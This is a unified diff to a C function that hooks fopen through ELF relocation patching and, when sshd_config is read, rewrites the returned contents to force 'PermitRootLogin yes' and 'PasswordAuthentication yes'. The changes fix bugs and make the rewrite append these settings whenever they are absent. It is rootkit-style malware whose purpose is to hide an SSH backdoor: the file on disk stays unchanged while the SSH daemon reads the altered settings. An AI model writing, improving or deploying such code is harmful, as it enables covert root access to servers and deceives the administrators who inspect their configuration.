@@ -35,7 +35,8 @@ FILE *my_fopen(char *filename, char *mode)
 	/* get file size on disk of filename */	
 	signed long int orig_sshd_config_size;
 	struct stat st;	
-	stat(filename, &st);
+	if (stat(filename, &st) != 0)
+		return fp;
 	orig_sshd_config_size = (signed long int) st.st_size;
 
 	/* these strings will store pointers found from strstr() */
@@ -45,7 +46,7 @@ FILE *my_fopen(char *filename, char *mode)
 	/* these maintain a reference to the string we are going to replace
 	 * 	so strlen() is correct in later _WORK()s
 	 */
-	char *ref_PRL;
+	char *ref_PRL = NULL;
 	char *ref_PA = "PasswordAuthentication no\n";
 
 	/* setup so we don't have to use strcat() */
@@ -54,9 +55,9 @@ FILE *my_fopen(char *filename, char *mode)
 	int buf_off = 0;
 	int getline_len = 0; /* using n from getline() has been wrong - n has lost my trust */
 
-
-	enum worktype PermitRootLogin_enum = NOWORK;
-	enum worktype PasswordAuthentication_enum = NOWORK;
+	/* these enums will remain APPEND if there are no config options in sshd_config we wish to change */
+	enum worktype PermitRootLogin_enum = APPEND;
+	enum worktype PasswordAuthentication_enum = APPEND;
 
 	char *str = malloc(512);
 	size_t n = 0;
@@ -75,22 +76,17 @@ FILE *my_fopen(char *filename, char *mode)
 
 
 		if (strncmp(str, "PermitRootLogin ", strlen("PermitRootLogin ")) == 0) {
-			/* PermitRootLogin and strstr() is dumb now - we can wrap these iffs into a function and lose an extra pointer(PermitRootLogin) */
-			//PermitRootLogin = strstr(str, "PermitRootLogin"); 
-			PermitRootLogin = str;	
-		
-			if (PermitRootLogin != NULL) {
-
 				/* clear any previously set PermitRootLogin flags -- it's possible for a sshd_config to have duplicates */
 				PermitRootLogin_enum = NOWORK;
+
 				/* we have a valid PermitRootLogin string - not commented due to strNcmp
 				 *	if the string is set to yes then there is NOWORK to be done
 				 *	otherwise we will have to EXPLICITly redefine no
 				 */
 
-				char *setting = strstr(PermitRootLogin, "Yes");	
+				char *setting = strstr(str, "Yes");	
 				if (setting == NULL)
-					setting = strstr(PermitRootLogin, "yes");	
+					setting = strstr(str, "yes");	
 			
 				if (setting != NULL) {
 					PermitRootLogin_enum = NOWORK;
@@ -99,32 +95,26 @@ FILE *my_fopen(char *filename, char *mode)
 					PermitRootLogin_enum = EXPLICIT;
 				}
 
-				ref_PRL = strdup(PermitRootLogin);
+				ref_PRL = strdup(str);
 				PermitRootLogin = NULL;
-			}
+			
 		} 
 		
-		
 		if (strncmp(str, "PasswordAuthentication ", strlen("PasswordAuthentication ")) == 0) {
-			PasswordAuthentication = strstr(str, "PasswordAuthentication");
-
-			if (PasswordAuthentication != NULL) {
-
 				PasswordAuthentication_enum = NOWORK;
 
-				char *setting = strstr(PasswordAuthentication, "Yes");	
+				char *setting = strstr(str, "Yes");	
 				if (setting == NULL)
-					setting = strstr(PasswordAuthentication, "yes");	
+					setting = strstr(str, "yes");	
 			
 				if (setting != NULL) {
 					PasswordAuthentication_enum = NOWORK;
 				} else {
+					/* PasswordAuthentication [y-Y]es is not valid, but there is a valid PasswordAuthentication string */
 					PasswordAuthentication_enum = EXPLICIT;
 				}
+		} 
 
-				PasswordAuthentication = NULL;
-			}
-		}
 
 	}
 	free(str);
@@ -135,8 +125,8 @@ FILE *my_fopen(char *filename, char *mode)
 
 
 	char *PRL_Y = "PermitRootLogin yes\n";
-	char *PA_Y = "PasswordAuthentication yes\n ";
-	char *new = buf; /* this will handle wonky APPEND cases */
+	char *PA_Y = "PasswordAuthentication yes\n";
+	char *new = buf;
 
 	switch (PermitRootLogin_enum) {
 		case APPEND:
@@ -183,7 +173,8 @@ FILE *my_fopen(char *filename, char *mode)
 
 	hook_rela(ref_fopen_Rela, ref_fopen, RELOC_ADDEND);
 
-	free(ref_PRL);	
+	if (ref_PRL)
+		free(ref_PRL);	
 	return fp;
 }
 
